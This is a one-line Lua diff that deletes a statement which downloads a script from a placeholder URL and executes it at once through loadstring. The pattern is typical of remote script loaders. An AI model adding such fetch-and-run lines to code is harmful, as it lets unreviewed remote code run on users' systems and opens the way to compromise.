@@ -1,1 +1,0 @@
-loadstring(Raindrop:DownloadString('URL'))()
